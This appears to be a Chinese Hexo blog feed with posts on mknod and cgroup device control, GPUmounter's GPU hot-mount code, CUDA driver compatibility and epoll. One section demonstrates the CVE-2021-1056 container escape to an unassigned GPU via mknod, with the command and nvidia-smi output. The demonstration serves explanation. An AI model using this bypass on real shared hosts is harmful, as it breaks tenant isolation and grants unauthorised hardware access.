<h2 id="Linux-mknod-命令"><a href="#Linux-mknod-命令" class="headerlink" title="Linux mknod 命令"></a>Linux mknod 命令</h2><p>linux操作系统跟外部设备（如磁盘、光盘等）的通信都是通过设备文件进行的，应用程序可以打开、关闭、读写这些设备文件，从而对设备进行读写，这种操作就像读写普通的文件一样easy。linux为不同种类的设备文件提供了相同的接口，比如read(),write(),open(),close()。</p>
<p>在系统与设备通信之前，系统首先要建立一个设备文件，这个设备文件存放在/dev目录下。其实系统默认情况下就已经生成了很多设备文件，有时候需要自己手动新建一些设备文件，这个时候就会用到像mkdir, mknod这样的命令。</p>
<p>我们也可以自己mknod /dev/sda1_myref b 8 1来创建设备文件。设备文件可以看成是对linux内核设备对象的一个索引。所以主设备号和次设备号均相同的两个设备文件，对其中一个设备的修改，在另一个设备文件访问时也会看到修改的结果。</p>
<p> mknod 的标准形式为:       mknod DEVNAME {b | c}  MAJOR  MINOR</p>
<p>1，DEVNAME是要创建的设备文件名，如果想将设备文件放在一个特定的文件夹下，就需要先用mkdir在dev目录下新建一个目录；</p>
<p>2， b和c 分别表示块设备和字符设备：</p>
<pre><code>b表示系统从块设备中读取数据的时候，直接从内存的buffer中读取数据，而不经过磁盘；

c表示字符设备文件与设备传送数据的时候是以字符的形式传送，一次传送一个字符，比如打印机、终端都是以字符的形式传送数据；</code></pre>
<p>3，MAJOR和MINOR分别表示主设备号和次设备号：为了管理设备，系统为每个设备分配一个编号，一个设备号由主设备号和次设备号组成。主设备号标示某一种类的设备，次设备号用来区分同一类型的设备。linux操作系统中为设备文件编号分配了32位无符号整数，其中前12位是主设备号，后20位为次设备号，所以在向系统申请设备文件时主设备号不好超过4095，次设备号不好超过2^20 -1。</p>
<h2 id="cgroup-device子系统"><a href="#cgroup-device子系统" class="headerlink" title="cgroup device子系统"></a>cgroup device子系统</h2><p>使用devices 子系统可以允许或者拒绝cgroup中的进程访问设备。devices子系统有三个控制文件：devices.allow,devices.deny,devices.list。devices.allow用于指定cgroup中的进程可以访问的设备,devices.deny用于指定cgroup中的进程不能访问的设备，devices.list用于报告cgroup中的进程访问的设备。devices.allow文件中包含若干条目，每个条目有四个字段：type、major、minor 和 access。type、major 和 minor 字段中使用的值对应 Linux 分配的设备。</p>
<p>type指定设备类型：</p>
<pre><code>a - 应用所有设备，可以是字符设备，也可以是块设备

b- 指定块设备

c - 指定字符设备</code></pre>
<p>major和minor指定设备的主次设备号。</p>
<p>access 则指定相应的权限：</p>
<pre><code>r - 允许任务从指定设备中读取

w - 允许任务写入指定设备

m - 允许任务生成还不存在的设备文件</code></pre>
<p>具体可以参考<a href="https://www.cnblogs.com/lisperl/archive/2012/04/24/2468170.html" target="_blank" rel="noopener">这里</a></p>
<h2 id="pokerfaceSad-CVE-2021-1056-项目"><a href="#pokerfaceSad-CVE-2021-1056-项目" class="headerlink" title="pokerfaceSad/CVE-2021-1056 项目"></a>pokerfaceSad/CVE-2021-1056 项目</h2><p>这个项目主要是一个main.sh, 脚本里主要是查询GPU的major number，然后使用mknod 命令新增容器，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@container1:&#x2F;ttt# nvidia-smi </span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.80.02    Driver Version: 418.80.02    CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage&#x2F;Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|   0  Tesla P100-PCIE...  Off  | 00000000:86:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   33C    P0    25W &#x2F; 250W |      0MiB &#x2F; 16280MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">                                                                               </span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|  No running processes found                                                 |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@container1:&#x2F;ttt# ll -l &#x2F;dev&#x2F;nvidia0</span><br><span class="line">crw-rw-rw- 1 root root 195, 0 Jan 18 08:48 &#x2F;dev&#x2F;nvidia0</span><br><span class="line"></span><br><span class="line">root@container1:&#x2F;ttt# mknod -m 666 &#x2F;dev&#x2F;nvidia1 c 195 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@container1:&#x2F;ttt# nvidia-smi       </span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage&#x2F;Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|   0  Tesla P100-PCIE...  Off  | 00000000:86:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   32C    P0    25W &#x2F; 250W |      0MiB &#x2F; 16280MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  Tesla P100-PCIE...  Off  | 00000000:AF:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   28C    P0    25W &#x2F; 250W |      0MiB &#x2F; 16280MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">                                                                               </span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|  No running processes found                                                 |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>


<h2 id="GPUmounter-项目"><a href="#GPUmounter-项目" class="headerlink" title="GPUmounter 项目"></a>GPUmounter 项目</h2><p>该项目主要设计了一个项目，用于Kubernetes 内的集群，用于增加删除容器内的GPU卡数，主要功能是在容器外部进行操作，将容器内的GPU卡数增加或者减少</p>
<p>容器外部控制容器内GPU卡 数量的方法如下所示：</p>
<p>获取Pod对应的容器的cgroup文件信息，例如容器ID为d80172f6ba5f9d4e82ce6f95c592f89dfa5f3ad637c9c38f7739c04b1f9c5d62<br>则该容器对应的cgroup 的device 目录如下所示：<br>执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices&#x2F;system.slice&#x2F;docker-d80172f6ba5f9d4e82ce6f95c592f89dfa5f3ad637c9c38f7739c04b1f9c5d62.scope</span><br><span class="line"></span><br><span class="line">echo c &quot;195:0 rw&quot; &gt;devices.allow</span><br></pre></td></tr></table></figure>
<p>从该目录的cgroup.procs 文件中获取容器对应的PID，该文件可能存在多个PId，获取该文件中第一个PID，如下所示为157136</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@node1 docker-d80172f6ba5f9d4e82ce6f95c592f89dfa5f3ad637c9c38f7739c04b1f9c5d62.scope]# cat cgroup.procs </span><br><span class="line">157136</span><br><span class="line">157158</span><br><span class="line">157166</span><br><span class="line">157174</span><br></pre></td></tr></table></figure>

<p>进入容器命名空间执行命令</p>
<p> nsenter –target 157136 –mount<br> /bin/mknod -m  666   /dev/nvidia1  c 195 0</p>
<p>再次登录容器查看GPU信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@28cam0e1oddj1-0:&#x2F;ttt# nvidia-smi   </span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage&#x2F;Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|   0  Tesla P100-PCIE...  Off  | 00000000:86:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   33C    P0    26W &#x2F; 250W |      0MiB &#x2F; 16280MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  Tesla P100-PCIE...  Off  | 00000000:AF:00.0 Off |                    0 |</span><br><span class="line">| N&#x2F;A   29C    P0    25W &#x2F; 250W |      0MiB &#x2F; 16280MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N&#x2F;A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">                                                                               </span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|</span><br><span class="line">|  No running processes found                                                 |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>


<p>核心代码如下所示</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MountGPU</span><span class="params">(pod *corev1.Pod, gpu *device.NvidiaGPU)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	Logger.Info(<span class="string">"Start mount GPU: "</span> + gpu.String() + <span class="string">" to Pod: "</span> + pod.Name)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// change devices control group</span></span><br><span class="line">	containerID := pod.Status.ContainerStatuses[<span class="number">0</span>].ContainerID</span><br><span class="line">	containerID = strings.Replace(containerID, <span class="string">"docker://"</span>, <span class="string">""</span>, <span class="number">1</span>)</span><br><span class="line">    Logger.Info(<span class="string">"Pod :"</span> + pod.Name + <span class="string">" container ID: "</span> + containerID)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//拼接 该容器对应的cgroup 文件 例如：/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod1234_abcd_5678_efgh.slice</span></span><br><span class="line">	cgroupPath, err := cgroup.GetCgroupName(<span class="string">"cgroupfs"</span>, pod, containerID)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		Logger.Error(<span class="string">"Get cgroup path for Pod: "</span> + pod.Name + <span class="string">" failed"</span>)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	Logger.Info(<span class="string">"Successfully get cgroup path: "</span> + cgroupPath + <span class="string">" for Pod: "</span> + pod.Name)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获得容器对应的真实的cgroup目录，如/sys/fs/cgroup/devices+cgroupPath，即/sys/fs/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod17edd3dd_e2ec_43c6_8c7d_83d4322f1b2c.slice</span></span><br><span class="line">   <span class="comment">//将GPU 的版本信息读写权限配置到device.allow</span></span><br><span class="line">  <span class="comment">// echo c  "&#123;device.DEFAULT_NVIDA_MAJOR_NUMBER&#125;:&#123;gpu.MinorNumber&#125;  rw" &gt;  /sys/fs/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod17edd3dd_e2ec_43c6_8c7d_83d4322f1b2c.slice/devices.allow"</span></span><br><span class="line">	<span class="keyword">if</span> err := cgroup.AddGPUDevicePermission(cgroupPath, gpu); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		Logger.Error(<span class="string">"Add GPU "</span> + gpu.String() + <span class="string">"failed"</span>)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	Logger.Info(<span class="string">"Successfully add GPU: "</span> + gpu.String() + <span class="string">" permisssion for Pod: "</span> + pod.Name)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get target PID of this group</span></span><br><span class="line">    <span class="comment">//从文件 /sys/fs/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod17edd3dd_e2ec_43c6_8c7d_83d4322f1b2c.slice/cgroup.procs中获取PID</span></span><br><span class="line">	pids, err := cgroup.GetCgroupPIDs(cgroupPath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		Logger.Error(<span class="string">"Get PID of Pod: "</span> + pod.Name + <span class="string">" Container: "</span> + containerID + <span class="string">" failed"</span>)</span><br><span class="line">		Logger.Error(err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	PID, err := strconv.Atoi(pids[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		Logger.Error(<span class="string">"Invalid PID: "</span>, pids[<span class="number">0</span>])</span><br><span class="line">		Logger.Error(err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Logger.Info(<span class="string">"Successfully get PID: "</span> + strconv.Itoa(PID) + <span class="string">" of Pod: "</span> + pod.Name + <span class="string">" Container: "</span> + containerID)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// enter container namespace to mknod</span></span><br><span class="line">    <span class="comment">//进入容器命名mount 命名空间，执行mknod</span></span><br><span class="line">    <span class="comment">// nsenter --target containerPid --cgroup --ipc --mount --net --pid --user --uts  </span></span><br><span class="line">    <span class="comment">// "mknod -m " + device.DEFAULT_DEVICE_FILE_PERMISSION + " " + gpu.DeviceFilePath + " c " + strconv.Itoa(device.DEFAULT_NVIDA_MAJOR_NUMBER) + " " + strconv.Itoa(gpu.MinorNumber)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	cfg := &amp;namespace.Config&#123;</span><br><span class="line">		Mount:  <span class="literal">true</span>, <span class="comment">// Execute into mount namespace</span></span><br><span class="line">		Target: PID,  <span class="comment">// Enter into Target namespace</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := namespace.AddGPUDeviceFile(cfg, gpu); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		Logger.Error(<span class="string">"Failed to create device file in Target PID Namespace: "</span>, PID, <span class="string">" Pod: "</span>, pod.Name, <span class="string">" Namespace: "</span>, pod.Namespace)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	Logger.Info(<span class="string">"Successfully create device file in Target PID Namespace: "</span>, PID, <span class="string">" Pod: "</span>, pod.Name, <span class="string">" Namespace: "</span>, pod.Namespace)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/08/31/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>cuda与driver版本关系</title>
    <url>/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<p>#问题<br>  最近遇到了不少需要容器镜像需要更新cuda版本的问题，宿主机安装了低版本的GPU 驱动，但是需要使用高版本的CUDA，通常下载driver时，都会选择cuda版本，然后再去下载对于的GPU 驱动。Nvidia 官方给出了低版本驱动兼容cuda 的兼容列表，<a href="https://docs.nvidia.com/deploy/cuda-compatibility/index.html" target="_blank" rel="noopener">参考</a></p>
<p>  目前升级cuda的方式时，需要同时升级驱动，如下图所示 <img src="/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/1.png" alt="avatar"></p>
<p>  cuda toolkit包含两个主要组件</p>
<ol>
<li><p>开发库，包括cuda runtime</p>
</li>
<li><p>驱动部分，驱动部分又进一步分为两类</p>
<ol>
<li>kernel 态相关组件（display driver）</li>
<li>用户态组件（cuda driver、openGL driver等等）</li>
</ol>
<p>从cuda10.0开始，NVIDIA引入了一个前向升级的途径，能够在升级cuda driver的时候不修改内核态的组件。参考下图，这就能够基于已经存在的驱动，使用最新的cuda，从而降低驱动升级带来的风险。<img src="/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/2.png" alt="avatar"></p>
</li>
</ol>
<p> #源码兼容性<br> 基于特定版本的库（SDK）编译的应用仍然能够正常编译和运行，跨不同版本的SDK，CUDA driver 和Cuda runtime 都不支持源码级别的兼容性。API可能被废弃或者移除，开发者需要通过官方文档来获取这些信息。</p>
<p> #二进制兼容性<br> cuda driver（libcuda.so）提供了后向兼容性，例如，一个基于cuda3.2 SDK编译的应用仍然能够在现在的driver stack上正常运行，另一方面，cuda runtime不会做上述保证，如果你的应用动态链接到cuda9.2版本，那么这个应用只能运行在9.2的cuda runtime。如果应用是静态链接到runtime，那么他会在最小支持的driver上正常运行，下表列出了cuda 依赖的driver 版本信息<img src="/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/3.png" alt="avatar"></p>
<p> #支持<br> ##硬件兼容性<br> 当前支持的硬件如下表所示：<br> <img src="/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/4.png" alt="avatar"></p>
<p> ##前向兼容的升级途径<br> 新的升级cuda driver的方式是为了简化大规模系统的管理。当前这种升级方式只支持Tesla GPU。硬件支持是由kernel model driver 决定，新的cuda driver不会开启新的硬件支持</p>
<p> ##cuda应用兼容性<br> 基于行的cuda toolkits 编译的应用可以在特别的企业版Tesla driver 分支上支持。下表列出了cuda 和driver的兼容列表<br> <img src="/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/5.png" alt="avatar"></p>
<h2 id="特性支持"><a href="#特性支持" class="headerlink" title="特性支持"></a>特性支持</h2><p> cuda driver里面可能需要kernel-model的支持，而且可能只能使用新的kernel mode driver。 <img src="/2020/09/11/cuda%E4%B8%8Edriver%E7%89%88%E6%9C%AC%E5%85%B3%E7%B3%BB/6.png" alt="avatar"></p>
<p> #cuda兼容性平台<br> 涉及到cuda兼容性的的文件（也就是对于已经安装完的系统，这些文件不能替换），这些主要包括libcuda.so.<em>(cuda driver)和libnvidia-ptxjitcompiler.so.</em>(用于PTX文件的JIT just in time 编译器)，为了减少部署，nvidia引入了一个新的软件包cuda-compat-11.0，这个软件包提供了cuda兼容性的平台<br> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install cuda-compat-11-0</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>epoll的基本概念和C10K问题</title>
    <url>/2021/01/07/epoll%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%92%8CC10K%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="问题由来"><a href="#问题由来" class="headerlink" title="问题由来"></a>问题由来</h2><p>网络服务在处理数以万计的客户端连接时，往往出现效率低下甚至完全瘫痪，这被称为C10K问题。随着互联网的迅速发展，越来越多的网络服务开始面临C10K问题，作为大型网站的开发人员有必要对C10K问题有一定的了解。(本文的主要参考文献是 <a href="http://www.kegel.com/c10k.htmls%E3%80%82" target="_blank" rel="noopener">http://www.kegel.com/c10k.htmls。</a>) C10K问题的最大特点是：设计不够良好的程序，其性能和连接数与机器性能的关系往往是非线性的。举个例子：如果没有考虑过C10K问题，一个经典的基于select的程序能在旧服务器上很好处理1000并发的吞吐量，它在2倍性能新服务器上往往处理不了并发2000的吞吐量。这是因为在策略不当时，大量操作的消耗和当前连接数n成线性相关。会导致单个任务的资源消耗和当前连接数的关系会是O(n)。而服务程序需要同时对数以万计的socket进行I/O处理，积累下来的资源消耗会相当可观，这显然会导致系统吞吐量不能和机器性能匹配。为解决这个问题，必须改变对连接提供服务的策略。</p>
<h2 id="基本策略："><a href="#基本策略：" class="headerlink" title="基本策略："></a>基本策略：</h2><p>主要有两方面的策略：</p>
<p>1.应用软件以何种方式和操作系统合作，获取I/O事件并调度多个socket上的I/O操作；</p>
<p>2.应用软件以何种方式处理任务和线程/进程的关系。前者主要有阻塞I/O、非阻塞I/O、异步I/O这3种方案，后者主要有每任务1进程、每任务1线程、单线程、多任务共享线程池以及一些更复杂的变种方案。常用的经典策略如下：</p>
<ol>
<li><p>Serve one client with each thread/process, and use blocking I/O这是小程序和java常用的策略，对于交互式的长连接应用也是常见的选择(比如BBS)。这种策略很能难足高性能程序的需求，好处是实现极其简单， 容易嵌入复杂的交互逻辑。Apache、ftpd等都是这种工作模式。</p>
</li>
<li><p>Serve many clients with single thread, and use nonblocking I/O and readiness notification 这是经典模型，datapipe等程序都是如此实现的。优点在于实现较简单，方便移植，也能提供足够的性能；缺点在于无法充分利用多CPU的机器。尤其是程序本身没有复杂的业务逻辑时。</p>
</li>
<li><p>Serve many clients with each thread, and use nonblocking I/O and readiness notification 对经典模型2的简单改进，缺点是容易在多线程并发上出bug，甚至某些OS不支持多线程操作readiness notification。</p>
</li>
<li><p>Serve many clients with each thread, and use asynchronous I/O 在有AI/O支持的OS上，能提供相当高的性能。不过AI/O编程模型和经典模型差别相当大，基本上很难写出一个框架同时支持AI/O和经典模型，降低了程序的可移植性。在Windows上，这基本上是唯一的可选方案。<br>本文主要讨论模型2的细节，也就是在模型2下应用软件如何处理Socket I/O。</p>
<p><a href="https://blog.csdn.net/shenya1314/article/details/73691088" target="_blank" rel="noopener">https://blog.csdn.net/shenya1314/article/details/73691088</a></p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>iptables route 关系</title>
    <url>/2021/12/14/iptables-route-%E5%85%B3%E7%B3%BB/</url>
